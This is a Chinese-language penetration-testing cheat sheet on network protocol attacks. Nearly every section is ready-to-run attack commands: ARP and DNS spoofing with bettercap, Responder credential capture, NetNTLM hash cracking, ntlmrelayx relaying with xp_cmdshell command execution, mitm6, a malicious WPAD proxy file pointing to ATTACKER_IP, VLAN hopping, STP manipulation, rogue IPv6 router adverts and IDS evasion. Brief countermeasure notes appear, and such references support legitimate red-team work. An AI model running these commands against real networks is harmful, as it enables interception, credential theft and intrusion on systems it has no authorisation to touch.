# 二层/三层网络协议攻击

> 来源提炼: yaklang/hack-skills (network-protocol-attacks)
> 覆盖 ARP 欺骗、名称解析投毒(LLMNR/NBT-NS/mDNS)、WPAD 滥用、DHCPv6、VLAN 跳跃、STP 操纵、DNS 欺骗、IPv6 攻击、IDS/IPS 规避

## ARP 欺骗 (MitM 定位)

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP &
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP &
# bettercap
bettercap -iface eth0
> set arp.spoof.targets VICTIM_IP
> arp.spoof on
> net.sniff on
```

检测指标: ARP 表重复 MAC、非网关 IP 的 gratuitous ARP 风暴；对策 `arpwatch`、静态 ARP、802.1X。

## 名称解析投毒 (LLMNR/NBT-NS/mDNS)

```bash
responder -I eth0 -dwPv   # 捕获凭据
responder -I eth0 -A      # 被动分析
```

哈希格式与破解:

| 协议 | 类型 | hashcat 模式 | 可破解性 |
|------|------|-------------|---------|
| NTLMv1 | NetNTLMv1 | 5500 | 快，彩虹表可行 |
| NTLMv2 | NetNTLMv2 | 5600 | 中等，字典+规则 |
| NTLMv1-ESS | NetNTLMv1 | 5500 | 同 NTLMv1 |

```bash
hashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule
```

中继代替破解:

```bash
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t ldaps://DC01 --delegate-access   # RBCD
ntlmrelayx.py -t mssql://DB01 -q "exec xp_cmdshell 'whoami'"
```

## WPAD 滥用

```bash
responder -I eth0 -wPv
```

流程: 客户端查 DHCP→DNS→LLMNR/NBT-NS 找 wpad，Responder 返回伪造 wpad.dat，浏览器走攻击者代理强制 NTLM 认证。

```javascript
function FindProxyForURL(url, host) {
    return "PROXY ATTACKER_IP:3128; DIRECT";
}
```

## DHCPv6 攻击 (mitm6)

即使纯 IPv4 网络，Windows 客户端默认发 DHCPv6 solicit。

```bash
mitm6 -d domain.com
ntlmrelayx.py -6 -t ldaps://DC01 -wh fakewpad.domain.com -l loot --delegate-access
```

前置条件: SMB signing 关闭(中继 SMB)、DC 不强制 LDAP signing(中继 LDAP)、Domain Computers 配额>0(默认 10)。

## VLAN 跳跃

```bash
# DTP switch spoofing
yersinia dtp -attack 1 -interface eth0
# double tagging (802.1Q)
from scapy.all import *
pkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst="TARGET")/ICMP()
sendp(pkt, iface="eth0")
```

对策: `switchport nonegotiate`、native VLAN 设为未用、trunk 端口裁剪。

## STP 操纵

```bash
yersinia stp -attack 4 -interface eth0   # 声明 root bridge
yersinia stp -attack 1 -interface eth0   # 拓扑变更泛洪
```

对策: BPDU Guard、Root Guard、`spanning-tree portfast bpduguard enable`。

## DNS 欺骗

```bash
bettercap -iface eth0
> set dns.spoof.domains target.com, *.target.com
> set dns.spoof.address ATTACKER_IP
> dns.spoof on
```

## IPv6 攻击

```bash
atk6-fake_router6 eth0 ATTACKER_IPV6_PREFIX/64   # 伪造 RA
atk6-parasite6 eth0                              # 邻居欺骗
```

## IDS/IPS 规避

| 技术 | 方法 | 工具 |
|------|------|------|
| IP 分片 | 载荷分散 | `nmap -f`、`fragroute` |
| TTL 操纵 | 到 IDS 过期到目标到达 | `fragroute` |
| 编码规避 | URL/Unicode/hex | 自定义 |
| 会话拼接 | TCP 载荷分段 | `fragroute`、`nmap --data-length` |
| 时间控制 | 慢扫描 | `nmap -T0/-T1` |
| 诱饵扫描 | 混合诱饵 IP | `nmap -D RND:10` |
| Idle/Zombie | 空闲主机代理扫描 | `nmap -sI ZOMBIE_IP` |